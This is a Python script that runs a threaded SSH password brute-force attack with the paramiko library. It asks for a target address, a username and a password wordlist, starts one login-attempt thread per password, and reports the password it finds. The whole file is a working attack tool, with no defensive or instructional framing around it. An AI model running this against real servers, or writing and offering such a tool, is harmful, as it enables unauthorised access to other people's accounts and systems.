import paramiko,sys,os,socket,termcolor
import threading,time

stop_flag = 0


#Functions
def ssh_connect(password):
	global stop_flag
	# lines 6,7 make the connection with the paramiko lib
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	# this try and except gone try to connect with the cardentials we provided
	try:
		ssh.connect(host,port=22,username=username,password=password)
		stop_flag = 1
		print(termcolor.colored((f"[+] Found Password: {password}, for Account {username}"), 'green'))
	except:
		print(termcolor.colored((f"[-] Incorrect Login: {password}"), 'red'))
	# Simply close the ssh connection 
	ssh.close()

host = input("[+] Target Address: ")
username = input("[+] SSH Username: ")
input_file = input("[+] Passwords File: ")
print('\n')

if os.path.exists(input_file) == False:
	print("[!!] The File/Path doesnt exists!")
	sys.exit(1)

print(f"*** Starting Threaded SSH Bruteforce On {host}, with the account {username} ***")
with open(input_file, 'r') as password_file:
	for line in password_file.readlines():
		if stop_flag == 1:
			t.join()
			exit()
		password = line.strip()
		t = threading.Thread(target=ssh_connect,args=(password,))
		t.start()
		time.sleep(0.5)